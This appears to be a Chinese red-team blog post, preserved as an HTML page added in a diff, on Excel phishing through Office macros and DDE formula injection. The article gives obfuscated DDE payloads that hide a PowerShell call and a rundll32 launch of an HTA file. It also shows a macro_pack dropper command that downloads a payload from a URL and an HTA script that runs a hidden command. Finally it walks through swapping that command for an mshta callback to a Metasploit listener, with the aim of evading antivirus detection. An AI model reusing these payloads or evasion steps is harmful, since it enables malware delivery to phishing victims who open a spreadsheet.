@@ -1,0 +1,1440 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="兄弟，你看起来很累，别这样子。  文章首发云众可信，博客备份。">
+<meta name="keywords" content="钓鱼">
+<meta property="og:type" content="article">
+<meta property="og:title" content="execl钓鱼">
+<meta property="og:url" content="https://lengjibo.github.io/execl/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="兄弟，你看起来很累，别这样子。  文章首发云众可信，博客备份。">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://note.youdao.com/yws/res/23261/WEBRESOURCEf6857ed2d8a28ad07cbedc0b0821f8ed">
+<meta property="og:image" content="http://note.youdao.com/yws/res/23272/WEBRESOURCEfd33226d243c314f3443fb70f71dab99">
+<meta property="og:image" content="http://note.youdao.com/yws/res/23316/WEBRESOURCEdd28fe64ee90e45aadd348d7509db8f9">
+<meta property="og:image" content="http://note.youdao.com/yws/res/23319/WEBRESOURCE634dc393235725838493541b9f6e557e">
+<meta property="og:image" content="https://note.youdao.com/yws/res/23333/WEBRESOURCE49f2f818be1a6b4ae3c430413cf9345b">
+<meta property="og:image" content="http://note.youdao.com/yws/res/23351/WEBRESOURCE3305b51cba22f17136817ea4c67a2fa5">
+<meta property="og:image" content="http://note.youdao.com/yws/res/23373/WEBRESOURCE318e2a081549e509cf12cfaa88ea18b4">
+<meta property="og:image" content="http://note.youdao.com/yws/res/23381/WEBRESOURCEabf2f3776585ed9741bc421ae4c70a33">
+<meta property="og:image" content="http://note.youdao.com/yws/res/23391/WEBRESOURCEff26fb9fd9534db117ad8a6667f64199">
+<meta property="og:image" content="http://note.youdao.com/yws/res/23405/WEBRESOURCE7471ce661175de309a2c84d5f73a7966">
+<meta property="og:image" content="http://note.youdao.com/yws/res/23408/WEBRESOURCEb3bbe52a90da1500977ed4274335de11">
+<meta property="og:image" content="https://note.youdao.com/yws/res/23418/WEBRESOURCEb956e13694d2d3c9ec4ff6dc732e181b">
+<meta property="og:image" content="https://note.youdao.com/yws/res/23420/WEBRESOURCEbfe0f7a1455ec8707e17d89f9626dbaa">
+<meta property="og:updated_time" content="2020-02-21T02:54:59.348Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="execl钓鱼">
+<meta name="twitter:description" content="兄弟，你看起来很累，别这样子。  文章首发云众可信，博客备份。">
+<meta name="twitter:image" content="http://note.youdao.com/yws/res/23261/WEBRESOURCEf6857ed2d8a28ad07cbedc0b0821f8ed">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/execl/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>execl钓鱼 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/execl/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">execl钓鱼
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-02-21 10:24:16 / Modified: 10:54:59" itemprop="dateCreated datePublished" datetime="2020-02-21T10:24:16+08:00">2020-02-21</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/RedTeam/" itemprop="url" rel="index"><span itemprop="name">RedTeam</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>兄弟，你看起来很累，别这样子。</p>
+<hr>
+<p>文章首发云众可信，博客备份。</p>
+<a id="more"></a>
+<h2 id="execl钓鱼简介"><a href="#execl钓鱼简介" class="headerlink" title="execl钓鱼简介"></a>execl钓鱼简介</h2><p>关于excel钓鱼是由来已久的一种攻击方式，目前本人已知的方法有：</p>
+<ul>
+<li>office宏攻击</li>
+<li>DDE攻击</li>
+<li>power query　DDE(DDE的一种)</li>
+</ul>
+<h3 id="1、office宏攻击"><a href="#1、office宏攻击" class="headerlink" title="1、office宏攻击"></a>1、office宏攻击</h3><p>宏攻击，一种古老的攻击手法，依靠在office中插入恶意的vbs代码，来执行恶意shellcode。在cs中就有现成的宏攻击。</p>
+<p><img src="http://note.youdao.com/yws/res/23261/WEBRESOURCEf6857ed2d8a28ad07cbedc0b0821f8ed" alt="image.png"></p>
+<p>然后按照步骤加入宏，用户在启用宏的情况下即可顺利上线。</p>
+<h3 id="DDE攻击"><a href="#DDE攻击" class="headerlink" title="DDE攻击"></a>DDE攻击</h3><p>动态数据交换（DDE），它是在Microsoft Windows操作系统中实现的客户端/服务器通信方法。我关注到这类攻击还是从推特的大佬哪里看到的：</p>
+<p><img src="http://note.youdao.com/yws/res/23272/WEBRESOURCEfd33226d243c314f3443fb70f71dab99" alt="image.png"></p>
+<p>在开源的openoffice中可以直接只有DDE函数，像=DDE(“cmd”;”/C calc”;”123”)这样调用。</p>
+<p>而在正规的office套件中则移除了DDE函数，但是我们还是可以使用application|topic!item这一格式的三元表达式调用DDE。注意：该方法的提示窗口只提示application而不提示topic。</p>
+<p>一些特性：</p>
+<p>1、当excel遇到+和-会自动填充=成为公式，如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+thespnquisition(cmd|&apos;/c calc.exe&apos;!A</span><br></pre></td></tr></table></figure>
+<p>2、若打开的外部应用为8字符，excel自动忽略后面的字符，如下面的两个作用相同：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">=rundll32|&apos;URL.dll,OpenURL calc.exe&apos;!A</span><br><span class="line">=rundll321234567890abcdefghijklmnopqrstuvwxyz|&apos;URL.dll,OpenURL calc.exe&apos;!A</span><br></pre></td></tr></table></figure>
+<p>3、将其他表达式或空格填充在恶意表达式之前</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=AA+BB-CC&amp;&quot;Hello&quot;/12345&amp;cmd|&apos;/c calc.exe&apos;!A</span><br></pre></td></tr></table></figure>
+<p>4、通过windows batch的语法特性，填充无意义或是不影响执行逻辑的字符和指令，将topic字段混淆，如文章开始处的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=cmd|&apos;/c REM.&amp;&amp;@p^o^w^e^r^s^h^e^l^l c:/*/*2/?al?.?x?&quot;&apos;!_xlbgnm.A1</span><br></pre></td></tr></table></figure>
+<p>/c是cmd参数，表示执行后关闭窗口</p>
+<p>REM表示后面的内容是注释</p>
+<p>.表示空行，用于终止之前的REM</p>
+<p>&amp;&amp;表示如果前一条指令执行成功则执行后一条指令</p>
+<p>@ 表示执行窗口不显示后面的命令</p>
+<p>^表示转义，此处无实际意义，只是用来混淆powershell这一敏感词</p>
+<p><em>?表示powershell通配符，其中</em>匹配任意字符串，?匹配1个字符，此处能唯一定位到c:/windows/system32/calc.exe</p>
+<p>“无实际用途，删了也没啥区别</p>
+<p>所以经过解析后，实际执行的命令是:</p>
+<p>cmd.exe/c powershell c:/windows/system32/calc.exe</p>
+<p>当然，也可以使用字符串拼接的特性，将命令变为下面这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=MSEXCEL|&apos;\..\..\..\Windows\System32\cmd.exe /c REM.&amp;&amp;@p^o^w^e^r^s^h^e^l^l c:/*/*2/?al?.?x?&quot;&apos;!_xlbgnm.A1</span><br></pre></td></tr></table></figure>
+<p><img src="http://note.youdao.com/yws/res/23316/WEBRESOURCEdd28fe64ee90e45aadd348d7509db8f9" alt="image.png"></p>
+<p>msf也集成了这种攻击方法：</p>
+<p><img src="http://note.youdao.com/yws/res/23319/WEBRESOURCE634dc393235725838493541b9f6e557e" alt="image.png"></p>
+<h3 id="power-query-DDE-DDE的一种"><a href="#power-query-DDE-DDE的一种" class="headerlink" title="power query　DDE(DDE的一种)"></a>power query　DDE(DDE的一种)</h3><p>参考：<a href="https://xz.aliyun.com/t/5514" target="_blank" rel="noopener">https://xz.aliyun.com/t/5514</a></p>
+<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>实现思路：DDE + 宏　+　lolbin进行钓鱼，实现vt静态全免。</p>
+<p><img src="https://note.youdao.com/yws/res/23333/WEBRESOURCE49f2f818be1a6b4ae3c430413cf9345b" alt="3.png"></p>
+<p>具体的思路如下：使用宏远程下载一个hta文件，然后依靠dde加载该hta，hta为一个启动mshta的恶意程序。</p>
+<p>首先，我们要建立一个使用宏远程下载的excel文件，如果会vbs的话可以自己进行编写，如果不会的话可以使用macro_pack进行辅助，（macro_pack是一个用于自动生成混淆过的MS Office文档、VB脚本等其他格式的工具，其主要目的是用于渗透测试、demo以及社会工程学的评估。macro_pack的目标是简化利用流程，反恶意软件绕过，并自动化vba生成到最终Office文档生成的过程。）我们的目的是使用它生成一个具有下载功能的excel。我们可以使用下面的方法进行生成：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;https://myurl.url/payload.exe&quot; &quot;dropped.exe&quot; |  macro_pack.exe -t DROPPER -G &quot;drop.xls&quot;</span><br></pre></td></tr></table></figure>
+<p>这样生成的xls文档就会自动下载url的payload.exe,并保存为dropped.exe。然后执行，但是我们不要求它进行执行，所以需要删除掉里面执行的代码：</p>
+<p><img src="http://note.youdao.com/yws/res/23351/WEBRESOURCE3305b51cba22f17136817ea4c67a2fa5" alt="image.png"></p>
+<p>将里面的ExecuteCmdAsync downloadPath给删除掉，并删除其构造代码，然后更改下载路径为你自己想要的路径，服务器地址为你的地址即可。</p>
+<p>然后我们此时打开该文档，就会提示我们运行宏，我们允许，则会在我们刚才设置的地方下载好我们的hta文件。然后我们将宏代码保存为vba文件，使用下面的命令将其混淆：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">macro_pack.exe -f xxx.vba -o -G xxx.xls</span><br></pre></td></tr></table></figure>
+<p>此时我们的宏已经变成了下面的模样：</p>
+<p><img src="http://note.youdao.com/yws/res/23373/WEBRESOURCE318e2a081549e509cf12cfaa88ea18b4" alt="image.png"></p>
+<p>然后我们下面就需要调用我们的hta文件了。我们说过了，要使用dde，我们这里就使用dde去调用rundll32.exe去运行我们的hta文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=MSEXCEL|&apos;\..\..\..\Windows\System32\rundll32.exe url.dll,FileProtocolHandler  c:\temp\payload.hta&apos;!_xlbgnm.A1</span><br></pre></td></tr></table></figure>
+<p><img src="http://note.youdao.com/yws/res/23381/WEBRESOURCEabf2f3776585ed9741bc421ae4c70a33" alt="image.png"></p>
+<p>具体信息请访问：<a href="https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface" target="_blank" rel="noopener">https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface</a></p>
+<p>比如当前我们的hta内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;calc.exe&quot;</span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/HEAD&gt; </span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+<p>那么将执行内部代码弹出计算器：</p>
+<p><img src="http://note.youdao.com/yws/res/23391/WEBRESOURCEff26fb9fd9534db117ad8a6667f64199" alt="image.png"></p>
+<p>但是，仅仅这样还是不够的我们还需要其他的，我们接下来再使用攻击中常见的一种手法，mshta攻击，用法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe payload地址</span><br></pre></td></tr></table></figure>
+<p>首先使用msf开启监听：</p>
+<p><img src="http://note.youdao.com/yws/res/23405/WEBRESOURCE7471ce661175de309a2c84d5f73a7966" alt="image.png"></p>
+<p>然后将这里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set objShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure>
+<p>改成mshta的利用语句并混淆，目标运行，成功上线：</p>
+<p><img src="http://note.youdao.com/yws/res/23408/WEBRESOURCEb3bbe52a90da1500977ed4274335de11" alt="image.png"></p>
+<p>vt查杀情况如下：</p>
+<p><img src="https://note.youdao.com/yws/res/23418/WEBRESOURCEb956e13694d2d3c9ec4ff6dc732e181b" alt="0.png"></p>
+<p>某卫士：</p>
+<p><img src="https://note.youdao.com/yws/res/23420/WEBRESOURCEbfe0f7a1455ec8707e17d89f9626dbaa" alt="1.png"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/execl/">execl钓鱼</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年02月21日 - 10:02</p>
+  <p><span>最后更新:</span>2020年02月21日 - 10:02</p>
+  <p><span>原始链接:</span><a href="/execl/" title="execl钓鱼">https://lengjibo.github.io/execl/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/execl/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/钓鱼/" rel="tag"><i class="fa fa-tag"></i> 钓鱼</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/cshell/" rel="next" title="自己编写反弹shell代码">
+                <i class="fa fa-chevron-left"></i> 自己编写反弹shell代码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/appbypass/" rel="prev" title="Applocker_Bypass">
+                Applocker_Bypass <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">85</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
